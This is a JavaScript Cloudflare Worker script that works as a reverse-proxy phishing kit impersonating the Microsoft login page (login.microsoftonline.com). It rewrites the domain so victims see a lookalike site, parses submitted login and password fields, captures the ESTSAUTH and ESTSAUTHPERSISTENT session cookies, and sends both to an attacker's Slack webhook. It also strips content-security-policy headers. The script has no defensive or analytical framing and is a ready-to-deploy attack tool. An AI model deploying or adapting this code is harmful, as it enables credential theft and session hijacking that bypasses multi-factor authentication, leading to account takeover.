const upstream = 'login.microsoftonline.com';
const upstream_path = '/';
const https = true;
const webhook = ''; // Slack webhook URL

const blocked_region = [];
const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
});

async function fetchAndApply(request) {
    const region = request.headers.get('cf-ipcountry')?.toUpperCase() || '';
    const ip_address = request.headers.get('cf-connecting-ip') || '';

    let all_cookies = "";
    let response = null;
    let url = new URL(request.url);
    let url_hostname = url.hostname;

    // Set URL protocol
    url.protocol = https ? 'https:' : 'http:';
    url.host = upstream;

    // Adjust URL pathname
    if (url.pathname === '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    // Log the URL and request details
    console.log(`Request URL: ${url.href}`);
    console.log(`Region: ${region}`);
    console.log(`IP Address: ${ip_address}`);

    if (blocked_region.includes(region)) {
        return new Response('Access denied.', { status: 403 });
    } else if (blocked_ip_address.includes(ip_address)) {
        return new Response('Access denied.', { status: 403 });
    } else {
        let method = request.method;
        let request_headers = new Headers(request.headers);
        request_headers.set('Host', upstream);
        request_headers.set('Referer', `${url.protocol}//${url_hostname}`);

        if (request.method === 'POST') {
            try {
                const temp_req = await request.clone();
                const body = await temp_req.text();
                const keyValuePairs = body.split('&');
                let message = "<b>Password found:</b><br><br>";

                for (const pair of keyValuePairs) {
                    const [key, value] = pair.split('=');
                    if (key === 'login') {
                        const username = decodeURIComponent(value.replace(/\+/g, ' '));
                        message += `<b>User</b>: ${username}<br>`;
                    }
                    if (key === 'passwd') {
                        const password = decodeURIComponent(value.replace(/\+/g, ' '));
                        message += `<b>Password</b>: ${password}<br>`;
                    }
                }

                if (message.includes("User") && message.includes("Password</b>")) {
                    console.log('Sending message to Slack:', message);
                    await slack(message, webhook);
                }
            } catch (error) {
                console.error('Error processing POST request:', error);
            }
        }

        let original_response = await fetch(url.href, {
            method: method,
            headers: request_headers,
            body: request.body
        });

        if (request_headers.get("Upgrade")?.toLowerCase() === "websocket") {
            return original_response;
        }

        let original_response_clone = original_response.clone();
        let response_headers = new Headers(original_response.headers);
        let status = original_response.status;

        response_headers.set('access-control-allow-origin', '*');
        response_headers.set('access-control-allow-credentials', true);
        response_headers.delete('content-security-policy');
        response_headers.delete('content-security-policy-report-only');
        response_headers.delete('clear-site-data');

        try {
            const originalCookies = response_headers.getAll("Set-Cookie") || [];
            all_cookies = originalCookies.join("; <br><br>");

            originalCookies.forEach(originalCookie => {
                const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
                response_headers.append("Set-Cookie", modifiedCookie);
            });
        } catch (error) {
            console.error('Error processing cookies:', error);
        }

        const content_type = response_headers.get('content-type');
        const original_text = await replace_response_text(original_response_clone, upstream, url_hostname);

        if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
            console.log('Sending cookies to Slack:', all_cookies);
            await slack(`<b>Cookies found:</b><br><br>${all_cookies}`, webhook);
        }

        return new Response(original_text, {
            status,
            headers: response_headers
        });
    }
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text();
    text = text.replace(new RegExp(upstream_domain, 'g'), host_name);
    return text;
}

async function slack(message, webhook) {
    const payload = {
        text: message
    };

    try {
        const response = await fetch(webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Failed to send message to Slack:', errorText);
            throw new Error('Failed to send message to Slack');
        }

        console.log('Message sent to Slack successfully');
        return new Response('Message sent to Slack successfully', { status: 200 });
    } catch (error) {
        console.error('Error sending message to Slack:', error.message);
        return new Response(`Error: ${error.message}`, { status: 500 });
    }
}
